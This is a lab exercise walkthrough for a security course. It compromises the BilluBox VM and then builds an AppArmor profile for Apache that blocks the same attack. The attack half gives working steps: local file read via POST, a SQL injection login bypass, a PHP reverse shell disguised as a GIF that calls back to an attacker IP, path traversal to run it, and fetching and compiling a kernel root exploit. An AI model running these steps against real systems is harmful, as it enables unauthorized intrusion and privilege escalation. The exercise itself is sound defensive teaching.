---
layout: exercise
exercise: 60
title: "Exercise: AppArmor on BilluBox"
vm: billubox
tools: dirbuster nmap exploitdb python3 curl netcat-traditional openssh-client
directories_to_sync: Billubox-Exercise
---

## Steps

1. On your Kali system, start up a fresh lxterminal by clicking the "sparrow" logo in the bottom-left corner of the screen, clicking run, typing `lxterminal` and hitting enter. 

2. Start by port scanning the Billubox machine with nmap. The `-sT` flag asks for a TCP port scan. The `-p-` flag tells `nmap` to scan all 65,536 ports, not just the most commonly-used ports.  The `-sV` flag tells `nmap` to do a "version scan," where it interacts with any open ports it finds, trying to determine what software is running and potentially what versions of that software. Finally, the `-Pn` flag tells `nmap` that it should scan the Billubox machine even if Billubox doesn't respond to pings. 

    ```shell
    nmap -sT -p- -sV -Pn billubox
    ```

3. Now we'll browse to the billubox web site, where we see a form that taunts us, telling us to prove our SQLi skills: <http://billubox/>

4. Instead, let's fire up `dirbuster`:

    ```shell
    dirbuster
    ```

5. In the `dirbuster` window, fill out the target URL with <http://billubox/>

6. To complete the "File with list of dirs/files" box, choose the "Browse" box to its right, then navigate that window to `/usr/share/dirbuster/wordlists/` and choose `directory-list-2.3-small.txt`.

7. Now click the "Start" button in the lower right corner of the dirbuster window, and then switch to the "Results - List View" tab.

8. Our `dirbuster` run finds a number of PHP files that you can investigate later.  For now, let's take a look at `test.php`.  Anything that says "test," "dev," or "debug" is interesting to a penetration tester.

9. Point your browser at: <http://billubox/test.php>

10. We get back a response that says we're missing a file parameter. Let's try submitting one as a `GET` request:

11. Use this link:  <http://billubox/test.php?file=/etc/passwd>

12. Unfortunately, we get back the same response.  It must need a POST request.  We could start up Burpsuite or another man-in-the-middle proxy, but let's just use a `curl` command. Start a new terminal tab, then run this `curl` command:

    ```shell
    curl -X POST --data "file=/etc/passwd" http://billubox/test.php
    ```

13. We get back the contents of the `/etc/passwd` file on this system! So we can read any file on the system that the web server can read.  Let's read the front page's source code, to see if we can figure out how a SQL injection attack might work for this:

    ```shell
    curl -X POST --data "file=./index.php" http://billubox/test.php
    ```

14. We can read the page and see that the SQL string is built from these three lines of code:

    ```
    $uname=str_replace('\'','',urldecode($_POST['un']));
    $pass=str_replace('\'','',urldecode($_POST['ps']));
    $run='select * from auth where pass=\''.$pass.'\' and uname=\''.$uname.'\'';
    ```

15. Think about the intent of those three lines of code. 

    The first two lines receive the `un` and `ps` parameters from the POST request, do some decoding and filtering on them, and assign them to the variables `$uname` and `$pass`, respectively.  
    
    The last line then queries a SQL database's `auth` table, which contains username and password combinations, asking for any lines where the `pass` column matches `$pass`'s contents and the `uname` column matches `$uname`'s contents. 
    
    If this `select` command returns a matching line, then login is granted as that line's user. 

    Our goal is to enter values for the form's `un` and `pass` variables that will, after going through the filtering, cause the `select` command to return one or more rows. 

16. The `str_replace()` removes single quotation marks, blocking the most common attack string for this, which would be `' OR 1=1 -- `. Let's try replacing both `$user` and `$pass` with:

    ```
     OR 1=1 -- \
    ```

    Then the third line of code above would set `$run` to this, which makes the SQL statement return all rows in the `auth` table:

    ```
    select * from auth where pass=' OR 1=1 -- \' and uname=' OR 1=1 -- \'
    ```

    This can be difficult to follow, so if you're having trouble picturing this, keep reading the rest of this instruction.
    
    First, notice that the line is looking for any rows where pass is set to the following value, which has a single quote (') mark in it:
    
    ```
    ' OR 1=1 -- \' and uname='
    ```
    
    So now let's simplify that. If you think of the string ` OR 1=1 -- ' and uname=` as `FOO`, you can think of the `select` command as something that says:

    ```
    select * from auth where pass='FOO' OR 1=1 -- \'
    ```

    Next, recognize that the `--` is a comment field, so the SQL database is only trying to handle this command:

    ```
    select * from auth where pass='FOO' OR 1=1
    ```

    Since `1=1` is true for every row in the database's `auth` table, the `select` statement now returns every row. 
    
17. So lets try logging in to <http://billubox/> by setting both the username and password to ` OR 1=1 -- \`:

    Press the following key sequence:  `(space)OR(space)1=1(space)--(space)\`

18. Now we're logged in and we've been sent to <http://billubox/panel.php>.  This page has two apparent functions.  One lets you add users, while the other shows you users that exist. Let's read its source code using the old `test.php` issue we found.

19. In a terminal, run:

    ```shell
    curl -X POST --data "file=./panel.php" http://billubox/test.php | less
    ```

    It looks like the form here has an interesting situation.  The `load` parameter is placed into a choice variable.  The `load` parameter should only have two possible values, `add` and `show`, corresponding to the two apparent functions.  But if you put something else in that parameter, it will be run, by being included in the current PHP program.

    ```
    $choice=str_replace('./','',$_POST['load']);

    if($choice==='add')
    {
        include($dir.'/'.$choice.'.php');
        die();
    }

    if($choice==='show')
    {
        include($dir.'/'.$choice.'.php');
        die();
    }
    else
    {
        include($dir.'/'.$_POST['load']);
    }
    ```

    So we've found a way to run PHP code if we can get it placed onto the target filesystem. How might we do that?

20. You may have noticed that the user add functionality lets me upload a picture.  Let's take a look at how that function works.  If we continue looking at the `panel.php` source code, further down in the code, we see that uploaded image files are moved by `move_uploaded_file()` into `./uploaded_images/`. So could we upload a file with PHP code in it, by pretending it's the picture (image file) for a new user we are creating? Here's that line of code that shows the movement of uploaded image files.

    ```
    if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name']))
    ```

21. Let's create a file with PHP code that looks like an image file. We can't put the right extension on the file, because `panel.php` checks to make sure that the file is actually an image. Luckily for us, it does that check using the PHP `finfo_file()` function, which is easily fooled.  If our uploaded "image" file's first line is `GIF89`, PHP's `finfo_file()` function will decide our file is a valid `GIF` file.  Create a `php-reverse.gif` file, starting with that magic `GIF89` line:

    ```shell
    echo "GIF89" >php-reverse.gif
    ```
    
22. Next, append the PHP reverse shell program from Kali Linux's `/usr/share/webshells/php/` directory:

    ```shell
    cat /usr/share/webshells/php/php-reverse-shell.php >>php-reverse.gif
    ```
    
23. We need to change the stock destination IP address and port in that file. We can do that with the `sed` command. We use `'s/127.0.0.1/10.23.58.30/'` to tell `sed` to substitute any occurence of the regular expression `127.0.0.1` with the text `10.23.58.30`. We use `sed`'s `-i` flag to tell it to alter a file in-place. We then use a second `sed` command to do the same kind of substition for `1234`, changing it to `4444`.

    ```shell    
    sed -i 's/127.0.0.1/10.23.58.30/' php-reverse.gif
    sed -i 's/1234/4444/' php-reverse.gif
    ```

24. Set up a netcat listener to catch the shell:

    ```shell
    nc -l -p 4444
    ```

25. Now go back to the browser, which is logged into `panel.php`, and choose the "Add User" option, clicking continue.

26. Click browse to upload your hostile `php-reverse.gif` image.

27. Fill in any name and any postal address, then click the upload button.

28. Now we need to trigger the `panel.php` POST with the load variable set to the path of our hostile `php-reverse.gif` image.  We won't use curl for this, because we want to use our current session state.

    Let's make this easier on ourselves and create a replica of the form components.  We've done this for you, basically by pulling down a copy of the form with `curl`, then adding this to the form tag: `action="http://billubox/panel.php"`.  You can use the form we've created for you by copying this link into your browser's URL bar and hitting the enter key.

    [file:///root/Billubox-Exercise/panel-form.html](file:///root/Billubox-Exercise/panel-form.html)

    Here are its contents:

    ```
    <HTML><BODY>
    <form action="http://billubox/panel.php" method=post>
    <input type=text name=load>
    <input type=submit name=continue value="continue">
    </form>
    ```

29. Put this into the text field and click continue:

    ```
    ../../../../../../../var/www/uploaded_images/php-reverse.gif
    ```

30. Now, go back to your terminal window, where you should have a Billubox shell waiting for you.

    At the very top of your shell output, you have a kernel version.  It's a very old version, 3.13.0:

    ```
    Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
    ```

31. Type `id` to see what user you have:

    ```shell
    id
    ```

    It looks like we've got user `www-data`.  Let's find a path to `root`.

32. Start up a new terminal window or tab and search exploitdb for this, using the local cache of exploitdb on our Kali boxes:

    ```shell
    searchsploit 3.13.0
    ```

    This tell us that we have an available exploit at:

    ```
    /usr/share/exploitdb/exploits/linux/local/37292.c
    ```

33. Switch to the `Billubox-Exercise` directory and copy the exploit file `37292.c` there:

    ```shell
    cd /root/Billubox-Exercise/
    cp /usr/share/exploitdb/exploits/linux/local/37292.c . 
    ```

34. Now stage a web server hosting the `37292.c` exploit source code:

    ```shell
    python3 -m http.server 80
    ```

35. In the terminal window/tab where you have your Billubox shell, pull down the exploit:

    ```shell
    cd /tmp
    wget http://10.23.58.30/37292.c
    ```

36. Now, compile the exploit on Billubox and run the exploit against Billubox's kernel:

    ```shell
    gcc -o exploit 37292.c
    ./exploit
    ```

37. Congratulations! You've got root.  Now let's turn around and cut off an another attacker's ability to do what we just did, but proactively. We'll use AppArmor to create a profile for this web application so it can't run shell commands.

38. To start, add a user to the system:

    ```shell
    useradd -m user
    passwd user
    ```

39. Set a password that you'll remember, like, say, `user`, then add the user to the sudoers file:

    ```shell
    echo "user ALL=(ALL) NOPASSWD:ALL" >>/etc/sudoers
    ```

40. We are now going to create two terminal sessions to Billubox.  One will be for running `aa-genprof`, while the other will be for controlling or running the program we are going to exercise. We will ask you to start new terminal windows or tabs.  

41. Open up a new terminal window/tab on your Kali system and `ssh` into the billubox:

    ```shell
    ssh user@billubox
    ```

42. Sudo to the `root` user, using the hypen (-) to get `root`'s environment settings:

    ```shell
    sudo su -
    ```

43. Start up a second terminal window/tab and then do the same thing:

    ```shell
    ssh user@billubox
    ```

44. Sudo to the `root` user, using the hypen (-) to get `root`'s environment settings:

    ```shell
    sudo su -
    ```

45. Let's lock this system down now, using AppArmor. Let's figure out what process gave us that shell as the `www-data` user.

    ```shell
    ps -ef | grep www-dat[a]
    ```

    The first shell we got on the system is in this readout, listed as:

    ```
    sh -c uname -a; w; id; /bin/sh -i
    ```

    Its parent process is one that runs `apache2`.  We can give `apache2` an AppArmor profile that will stop Apache from running a shell.

46. To start our exercise, end the netcat session that has the ill-gotten `root` shell in it by typing `exit` in that terminal window:

    ```shell
    exit
    ```

47. In your browser, log out of the billubox `panel.php` page using the logout button. Close all browser windows that are communicating with Billubox, for good measure.

48. In the first billubox SSH session window, start up the AppArmor profile generator, `aa-genprof`:

    ```shell
    aa-genprof /usr/sbin/apache2
    ```

49. In the second billubox SSH session window, restart the Apache web server:

    ```shell
    /etc/init.d/apache2 stop
    /etc/init.d/apache2 start
    ```

50. Now, let's exercise the application, without attacks, to ensure the AppArmor profile covers the expected, non-attack activity.

51. Start a fresh browser window and clear the cache, as shown below.There's a missing step 1.5, which is to click on "Settings".

    ![Clear Cache in Firefox](/assets/img/firefox-clear-cache.jpg)

52. Log in at this URL, using credentials `biLLu` and `hEx_it`

    <http://billubox/>

53. For extra credit, after class is over, find another attack path on this virtual machine that gets you those application credentials.

54. You'll now land on `panel.php` legitimately.  The drop-down menu will have "Show Users" available, so click continue to exercise that functionality.

55. You'll see the original users this machine shipped with, as well as the one you added to upload your shell.  Don't worry about this for now.

56. Now switch the drop-down menu to "Add User" and click continue to exercise that functionality.

57. Click Browse and choose that same fake gif file you created earlier.

58. Leave name and address at their defaults, but change the `1337` field to `1338`.

59. Now click "Upload", then the "Logout" button.

60. Go back into your second Billubox SSH session (not the one running `aa-genprof`) and stop the Apache2 daemon, to capture its shutdown activities.

    ```shell
    /etc/init.d/apache2 stop
    ```

61. We're now finished exercising the Apache daemon.  Go to your first Billubox SSH session, where `aa-genprof` is running, and hit `S` to scan for AppArmor events.

62. These events won't necessarily occur in exactly the same order for you.  We've put them in text blocks to make them easier to find. This is the result of one of our test runs. Here's what happened – as you get questions from `aa-genprof`, answer in the way that we have, please:

    - **Capability: net_bind_service**
        - `aa-genprof` will notice that Apache needs the `net_bind_service` root capability, to bind to a port below 1024. It asks if you want to generalize that to everything in the NIS abstraction include file.  Don't generalize - `hit 2`, then `hit A`.
    - **Capability: setgid**
        - `aa-genprof` will ask if you want to allow the Apache webserver to set its own GID, so it can drop from running as `root` to the `www-data` group -- we do want this.  `Hit A` to allow.
    - **Capability: setuid**
        - `aa-genprof` will ask if you want to allow the Apache webserver to set its own UID, so it can drop from running as `root` to the `www-data` user -- we do want this.  `Hit A` to allow.
    - **`/etc/apache2/apache2.conf`**
        - `aa-genprof` will ask you about letting Apache read `/etc/apache2/apache2.conf`. Let's generalize this to all of `/etc/apache2`.  `Hit G` to replace this with a glob for `/etc/apache2/*`, then `hit A` to allow.
    - **`/etc/apache2/conf.d/ANYFILE`**
        - `aa-genprof` will ask you about an individual file in  `/etc/apache2/conf.d`. Let's generalize this to all of `/etc/apache2/conf.d/`.  `Hit G` to replace this with a glob for `/etc/apache2/conf.d/*`, then `hit A` to allow.
    - **`/etc/apache2/conf.d/` directory access**
        - `aa-genprof` will ask you about the directory `/etc/apache2/conf.d/`. Let's tell `aa-genprof` that we mean business, and enter a new path that allows us to use a `**` glob, which means all subdirectories.  (Unfortunately, this won't cover `/etc/apache2/` itself, just its contents.)
        - `Hit N` to enter a new path and enter:

            ```
            /etc/apache2/**   <enter key>
            ```
        - `Hit A` to allow.
    - **`/etc/group`**
        - `aa-genprof` will ask you about reading `/etc/group`.  It will give you two options for abstractions. In your other terminal window, go review the two abstraction include files offered.  First, switch into the abstractions directory:

            ```shell
            cd /etc/apparmor.d/abstractions/
            ```
        - Next, read the `apache2-common` abstraction file:

            ```shell    
            less apache2-common
            ```

        - Let's not choose `apache2-common`, since that defeats some of the point of this exercise. Let's read the `nameservice` abstraction file:

            ```shell
            less nameservice
            ```

        - The nameservice abstraction includes these other abstractions (`nis ldapclient winbind likewise mdns ssl_certs`), but it's fairly safe.  Dig into these other abstractions if you like, looking especially for program execution capabilities or file write capabilities.

        - **Note**: one can search for lines that let the program run other programs  like so:

            ```shell
            grep -E 'px|Px|ix|ux|Ux|cx|Cx' nameservice nis ldapclient winbind likewise mdns ssl_certs
            ```

        - Here's our analysis:

            - We're most concerned about letting the Apache server write to files or execute programs.  The nameservice abstraction only allows execution of programs matching these two globs: `/var/run/nscd/db*` and `/run/nscd/db*`, but it doesn't allow writing to those files.

            - Via some of its include files, the nameservice abstraction allows writing to these files:

                ```
                /{,var/}run/{.,}nscd_socket
                /var/lib/likewise-open/lwidentity_privileged/pipe
                /var/{lib,run}/samba/winbindd_privileged/pipe
                /tmp/.winbindd/pipe
                /tmp/.lwidentity/pipe
                /{,var/}run/avahi-daemon/socket
                ```

        - We would get a tighter profile if we skipped this abstraction and just accepted individual lines, since many of the allowed file accesses come from abstractions we don't need. None of these rules allow the exploit path we've used, so choose the abstraction for simplicity.

        - In the `aa-genprof` terminal, `hit 2` to choose the nameserver abstraction then `hit A` for allow.

    - **`/etc/mime.types`**

        - We're asked to let Apache read the `/etc/mime.types` file, so it can make an attempt to tell if an uploaded file is truly an image file.  `Hit A` to allow.

    - **`/etc/php5/apache2filter/php.ini`**

        - We're asked if we'd like to allow Apache to read the `/etc/php5/apache2filter/php.ini` file. PHP needs this file, as this is its main configuration file.  `Hit A` to allow.

    - **`/etc/php5/conf.d/` directory access**

        - `aa-genprof` asks about `/etc/php5/conf.d/`, offering the php5 abstraction as well. The abstraction doesn't have any writes or executes, so we'll choose it. You could get a tighter filter by skipping the abstraction and just allowing access to the four files `aa-genprof` will ask about.  For this exercise, choose the abstraction (#include <abstractions/php5>), then `hit A` for allow.

    - **PID file access**

        - `aa-genprof` asks about Apache's PID file, where it writes a PID upon startup.  `Hit A` to allow.

    - **TMP file access**

        -  We're asked about a `/tmp/phpXXXXXX` file (where the X's in `XXXXXX` are random characters) that the PHP interpreter wants to both read and write. It's likely that if we don't generalize enough, we’ll run into problems. On the other hand, it's a bit dicey because we're letting PHP both read and write to a location that's reliably world-writable and thus useful to exploits.  Let's try to create a loose-enough and tight-enough pattern. You could use `/tmp/php

        - `Hit N` for new, then enter:

            ```
            /tmp/php* <enter key>
            ```

        - `Hit A` to allow.

    - **`/usr/lib/apache2/modules/mod_alias.so`**

        - Apache wants to read one of its module files (`mod_alias.so`) Let's generalize, but not as much as `aa-genprof` is suggesting. `Hit 1` to edit the `/usr/lib/apache2/modules/mod_alias.so` line, then `hit G` to glob that to the entire `/usr/lib/apache2/modules/` directory, then `hit A` to allow.

    - **`/usr/lib/php5/20090626\+lfs/mysql.so`**

        - Apache wants to read a PHP library: `/usr/lib/php5/20090626\+lfs/mysql.so`

        - This should have been covered by the PHP5 abstraction, but `aa-genprof` doesn't always remember that you've already approved an abstraction.  `Hit 1` to choose the abstraction, then `hit A` for allow.

    - **`/var/log/apache2/access.log`**

        - Apache asks to write to its access log at `/var/log/apache2/access.log`. This is a 'write' operation, which is more dangerous than a 'read', so we're not going to generalize.  `Hit A` to allow.

    - **`/var/log/apache2/other_vhosts_access.log`**

        - Apache asks to write to another access log at `/var/log/apache2/other_vhosts_access.log`.  `Hit A` to allow.

    - **`/var/log/apache2/error.log`**

        - Apache asks to write to its error log at `/var/log/apache2/error.log`.  `Hit A` to allow.

    - **`/var/www/add.php`**

        - Apache wants to read the `/var/www/add.php`. Let's `hit G` to glob that to `/var/www/*`, then `hit A` to allow. We could have instead `hit N` and enter `/var/www/**`, but if we look at this site, it only has one subdirectory, so we don't need to be that general.

    - **`/var/www/`**

        - Apache wants to read the `/var/www` directory.  `Hit A` to allow.

    - **`/var/www/images/` & `/var/www/uploaded_images/`**

        - You may be asked about one or two image directories, called` /var/www/images/` and `/var/www/uploaded_images`. Clearly, we’ll need to let Apache read all the images in those directories.  We could make a set of custom rules, allowing Apache to only read image files with specific extensions we expect to use, but that risks making a rule that’s too tight to work over time.

        - Using G to glob requests to `/var/www/images/*` and `/var/www/uploaded_images/*` or use `N` to create a rule that covers both, like:

            ```text
            /var/www/{,uploaded_}images/*
            ```

        - For globbing, here's an example: Apache needs to read `/var/www/uploaded_images/CaptBarbossa.JPG`, so `hit G` to glob this to `/var/www/uploaded_images/*`, then `hit A` to allow.

    - **`/var/www/uploaded_images/ANY-IMAGE.JPG`**

        - We get this question about another image in `/var/www/uploaded_images`, so just `hit A` to allow.

63. Eventually, `aa-genprof` says "The following local profiles were changed. Would you like to save them?" Hit `S` to save, then hit `F` to finish and begin enforcing this profile.

64. Run `aa-status` to see that `apache2` is now being contained by AppArmor.

    ```shell
    aa-status
    ```

65. Start the apache server back up:

    ```shell
    /etc/init.d/apache2 start
    ```

66. Keep a terminal window alive that contains the SSH session to the billubox virtual machine.

67. Start a new terminal window/tab on your Kali machine.

68. Start up the netcat listener on your Kali machine:

    ```shell
    nc -l -p 4444
    ```

69. Now browse to billubox from the Kali system's browser.  First, bypass the login page using the SQL injection attack, by setting both the username and password to:  ` OR 1=1 -- \`

70. Now, put the attack form in your browser URL bar: <file:///root/Billubox-Exercise/panel-form.html>

71. Put this into the text input area and click the continue button.

    ```
    ../../../../../../../var/www/uploaded_images/php-reverse.gif
    ```

72. You shouldn't get a shell.  Instead, the web page will show an error like this, "GIF89 WARNING: Failed to daemonise. This is quite common and not fatal..."

73. In the billubox SSH session, run a tail command on `/var/log/kern.log`:

    ```shell
    tail /var/log/kern.log
    ```

74. Notice that the very last line will be something like this:

    ```
    Jul 20 03:57:58 indishell kernel: [ 7963.186892] type=1400 audit(1532730478.867:1077): apparmor="DENIED" operation="exec" profile="/usr/lib/apache2/mpm-itk/apache2" name="/bin/dash" pid=7508 comm="apache2" requested_mask="x" denied_mask="x" fsuid=33 ouid=0
    ```

    This means that AppArmor stopped the `apache2` program from running a shell via the `/bin/dash` command.

75. Close all the terminal windows you started for this exercise.

76. Start a new terminal and suspend the virtual machines:

    ```shell
    sudo /sync/bin/suspend-all-vms.sh 
    ```
